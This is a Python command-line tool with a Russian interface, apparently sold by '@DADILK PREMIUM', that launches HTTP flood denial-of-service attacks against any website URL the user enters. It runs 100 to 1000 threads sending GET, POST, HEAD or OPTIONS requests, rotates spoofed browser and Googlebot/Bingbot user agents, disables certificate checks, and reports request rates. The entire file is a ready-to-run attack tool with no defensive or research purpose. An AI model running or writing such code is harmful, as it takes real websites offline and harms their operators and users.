#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# ===============================================================
# ██████╗ ██╗   ██╗██████╗  ██████╗ ███████╗
# ██╔══██╗██║   ██║██╔══██╗██╔═══██╗██╔════╝
# ██║  ██║██║   ██║██║  ██║██║   ██║███████╗
# ██║  ██║██║   ██║██║  ██║██║   ██║╚════██║
# ██████╔╝╚██████╔╝██████╔╝╚██████╔╝███████║
# ╚═════╝  ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
# ===============================================================
#         ДУДОС НА САЙТ / DDOS ON WEBSITE
# ===============================================================
#         BY @DADILK PREMIUM
# ===============================================================

import os
import sys
import time
import random
import threading
import requests
from urllib.parse import urlparse

# Цвета
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
PURPLE = '\033[95m'
CYAN = '\033[96m'
WHITE = '\033[97m'
RESET = '\033[0m'
BOLD = '\033[1m'

# ===============================================================
# ГЛАВНАЯ НАДПИСЬ
# ===============================================================

DUDOS_ASCII = f"""
{RED}██████╗ ██╗   ██╗██████╗  ██████╗ ███████╗{RESET}
{RED}██╔══██╗██║   ██║██╔══██╗██╔═══██╗██╔════╝{RESET}
{RED}██║  ██║██║   ██║██║  ██║██║   ██║███████╗{RESET}
{RED}██║  ██║██║   ██║██║  ██║██║   ██║╚════██║{RESET}
{RED}██████╔╝╚██████╔╝██████╔╝╚██████╔╝███████║{RESET}
{RED}╚═════╝  ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝{RESET}

{RED}███╗   ██╗ █████╗     ███████╗ █████╗  ██╗████████╗{RESET}
{RED}████╗  ██║██╔══██╗    ██╔════╝██╔══██╗██║╚══██╔══╝{RESET}
{RED}██╔██╗ ██║███████║    ███████╗███████║██║   ██║   {RESET}
{RED}██║╚██╗██║██╔══██║    ╚════██║██╔══██║██║   ██║   {RESET}
{RED}██║ ╚████║██║  ██║    ███████║██║  ██║██║   ██║   {RESET}
{RED}╚═╝  ╚═══╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝   {RESET}
"""

# ===============================================================
# ОСНОВНОЙ КЛАСС
# ===============================================================

class DudosNaSite:
    def __init__(self):
        self.stop_attack = False
        self.requests_sent = 0
        self.start_time = None
        self.session = None
        
    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')
    
    def print_menu(self):
        print(f"\n{RED}{'='*60}{RESET}")
        print(f"{RED}█{RESET} 1. {GREEN}🚀 ДУДОС НА САЙТ (HTTP/HTTPS){RESET}        {RED}█{RESET}")
        print(f"{RED}█{RESET} 2. {GREEN}💣 VIP РЕЖИМ (МАКСИМУМ){RESET}               {RED}█{RESET}")
        print(f"{RED}█{RESET} 3. {GREEN}🔥 МЕГА РЕЖИМ (1000 ПОТОКОВ){RESET}           {RED}█{RESET}")
        print(f"{RED}█{RESET} 0. {RED}❌ ВЫХОД{RESET}                                 {RED}█{RESET}")
        print(f"{RED}{'='*60}{RESET}")
    
    def attack_worker(self, url, method="GET"):
        """Рабочий поток для атаки"""
        headers_list = [
            {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'},
            {'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)'},
            {'User-Agent': 'Mozilla/5.0 (Linux; Android 11; SM-G998B)'},
            {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)'},
            {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64)'},
            {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0)'},
            {'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'},
            {'User-Agent': 'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)'},
        ]
        
        while not self.stop_attack:
            try:
                headers = random.choice(headers_list)
                headers['Accept'] = '*/*'
                headers['Accept-Language'] = 'ru-RU,ru;q=0.9,en;q=0.8'
                headers['Connection'] = 'keep-alive'
                headers['Cache-Control'] = 'no-cache'
                
                if method == "GET":
                    r = requests.get(url, headers=headers, timeout=2, verify=False)
                elif method == "POST":
                    data = {'key': random.randint(1, 999999)}
                    r = requests.post(url, headers=headers, data=data, timeout=2, verify=False)
                elif method == "HEAD":
                    r = requests.head(url, headers=headers, timeout=2, verify=False)
                elif method == "OPTIONS":
                    r = requests.options(url, headers=headers, timeout=2, verify=False)
                
                self.requests_sent += 1
                
            except:
                pass
    
    def start_attack(self, url, threads_count=100, method="GET"):
        """Запуск атаки"""
        self.stop_attack = False
        self.requests_sent = 0
        self.start_time = time.time()
        
        print(f"\n{RED}▶ ЗАПУСК АТАКИ НА: {WHITE}{url}{RESET}")
        print(f"{RED}▶ ПОТОКОВ: {WHITE}{threads_count}{RESET}")
        print(f"{RED}▶ МЕТОД: {WHITE}{method}{RESET}")
        print(f"{RED}▶ НАЖМИТЕ CTRL+C ДЛЯ ОСТАНОВКИ{RESET}\n")
        
        # Отключаем предупреждения SSL
        requests.packages.urllib3.disable_warnings()
        
        # Запускаем потоки
        threads = []
        for i in range(threads_count):
            t = threading.Thread(target=self.attack_worker, args=(url, method))
            t.daemon = True
            threads.append(t)
            t.start()
        
        # Мониторинг
        try:
            while True:
                time.sleep(1)
                elapsed = int(time.time() - self.start_time)
                rps = self.requests_sent / elapsed if elapsed > 0 else 0
                
                print(f"\r{RED}▶ ВРЕМЯ: {elapsed:4d}с | ЗАПРОСОВ: {self.requests_sent:8d} | RPS: {rps:5.0f}{RESET}", end="")
                
        except KeyboardInterrupt:
            self.stop_attack = True
            print(f"\n\n{RED}✅ АТАКА ОСТАНОВЛЕНА! ВСЕГО ЗАПРОСОВ: {self.requests_sent}{RESET}")
    
    def run(self):
        """Запуск программы"""
        while True:
            self.clear_screen()
            print(DUDOS_ASCII)
            print(f"\n{RED}{'='*60}{RESET}")
            print(f"{RED}█{RESET} {'ДУДОС НА САЙТ - ПРОСТО ВВЕДИ ССЫЛКУ':^60} {RED}█{RESET}")
            print(f"{RED}█{RESET} {'НИКАКИХ IP, НИКАКИХ ПОРТОВ':^60} {RED}█{RESET}")
            print(f"{RED}█{RESET} {'РАБОТАЕТ С HTTP И HTTPS':^60} {RED}█{RESET}")
            print(f"{RED}{'='*60}{RESET}")
            
            self.print_menu()
            
            choice = input(f"{RED}▶ ВЫБЕРИ РЕЖИМ: {WHITE}").strip()
            
            if choice == '0':
                break
            
            # Ввод сайта
            url = input(f"{RED}▶ ВВЕДИ САЙТ (например: https://example.com): {WHITE}").strip()
            
            # Добавляем https если нет протокола
            if not url.startswith(('http://', 'https://')):
                url = 'https://' + url
            
            if choice == '1':
                # Обычный режим
                try:
                    threads = int(input(f"{RED}▶ КОЛИЧЕСТВО ПОТОКОВ (100-500): {WHITE}").strip())
                except:
                    threads = 100
                
                self.start_attack(url, threads, "GET")
                input(f"\n{RED}▶ НАЖМИ ENTER ДЛЯ ПРОДОЛЖЕНИЯ...{RESET}")
                
            elif choice == '2':
                # VIP режим - комбинированная атака
                print(f"\n{RED}▶ VIP РЕЖИМ - КОМБИНИРОВАННАЯ АТАКА{RESET}")
                
                # Запускаем разные типы атак в разных потоках
                self.stop_attack = False
                self.requests_sent = 0
                self.start_time = time.time()
                
                requests.packages.urllib3.disable_warnings()
                
                # GET потоки
                for i in range(100):
                    t = threading.Thread(target=self.attack_worker, args=(url, "GET"))
                    t.daemon = True
                    t.start()
                
                # POST потоки
                for i in range(50):
                    t = threading.Thread(target=self.attack_worker, args=(url, "POST"))
                    t.daemon = True
                    t.start()
                
                # HEAD потоки
                for i in range(50):
                    t = threading.Thread(target=self.attack_worker, args=(url, "HEAD"))
                    t.daemon = True
                    t.start()
                
                print(f"\n{RED}▶ VIP АТАКА ЗАПУЩЕНА (200 ПОТОКОВ){RESET}")
                print(f"{RED}▶ НАЖМИТЕ CTRL+C ДЛЯ ОСТАНОВКИ{RESET}\n")
                
                try:
                    while True:
                        time.sleep(1)
                        elapsed = int(time.time() - self.start_time)
                        rps = self.requests_sent / elapsed if elapsed > 0 else 0
                        
                        print(f"\r{RED}▶ ВРЕМЯ: {elapsed:4d}с | ЗАПРОСОВ: {self.requests_sent:8d} | RPS: {rps:5.0f}{RESET}", end="")
                        
                except KeyboardInterrupt:
                    self.stop_attack = True
                    print(f"\n\n{RED}✅ VIP АТАКА ОСТАНОВЛЕНА! ВСЕГО ЗАПРОСОВ: {self.requests_sent}{RESET}")
                
                input(f"\n{RED}▶ НАЖМИ ENTER ДЛЯ ПРОДОЛЖЕНИЯ...{RESET}")
                
            elif choice == '3':
                # Мега режим - 1000 потоков
                print(f"\n{RED}▶ МЕГА РЕЖИМ - 1000 ПОТОКОВ{RESET}")
                
                self.stop_attack = False
                self.requests_sent = 0
                self.start_time = time.time()
                
                requests.packages.urllib3.disable_warnings()
                
                for i in range(1000):
                    t = threading.Thread(target=self.attack_worker, args=(url, "GET"))
                    t.daemon = True
                    t.start()
                
                print(f"\n{RED}▶ МЕГА АТАКА ЗАПУЩЕНА (1000 ПОТОКОВ){RESET}")
                print(f"{RED}▶ НАЖМИТЕ CTRL+C ДЛЯ ОСТАНОВКИ{RESET}\n")
                
                try:
                    while True:
                        time.sleep(1)
                        elapsed = int(time.time() - self.start_time)
                        rps = self.requests_sent / elapsed if elapsed > 0 else 0
                        
                        print(f"\r{RED}▶ ВРЕМЯ: {elapsed:4d}с | ЗАПРОСОВ: {self.requests_sent:8d} | RPS: {rps:5.0f}{RESET}", end="")
                        
                except KeyboardInterrupt:
                    self.stop_attack = True
                    print(f"\n\n{RED}✅ МЕГА АТАКА ОСТАНОВЛЕНА! ВСЕГО ЗАПРОСОВ: {self.requests_sent}{RESET}")
                
                input(f"\n{RED}▶ НАЖМИ ENTER ДЛЯ ПРОДОЛЖЕНИЯ...{RESET}")
        
        # Выход
        self.clear_screen()
        print(f"""
{RED}════════════════════════════════════════════════════════════{RESET}
{RED}█                                                          █{RESET}
{RED}█         ДУДОС НА САЙТ ЗАВЕРШАЕТ РАБОТУ                  █{RESET}
{RED}█                                                          █{RESET}
{RED}█         СПАСИБО ЗА ИСПОЛЬЗОВАНИЕ                        █{RESET}
{RED}█         BY @DADILK PREMIUM                              █{RESET}
{RED}█                                                          █{RESET}
{RED}════════════════════════════════════════════════════════════{RESET}
{RED}обход by DADILK{RESET}
{RED}Спасибо за покупку{RESET}
        """)

# ===============================================================
# ЗАПУСК
# ===============================================================

if __name__ == "__main__":
    try:
        dudos = DudosNaSite()
        dudos.run()
    except KeyboardInterrupt:
        print(f"\n{RED}❌ ВЫХОД{RESET}")
        print(f"{RED}обход by DADILK{RESET}")
        print(f"{RED}Спасибо за покупку{RESET}")
        sys.exit(0)

# ===============================================================
# КОНЕЦ
# ===============================================================
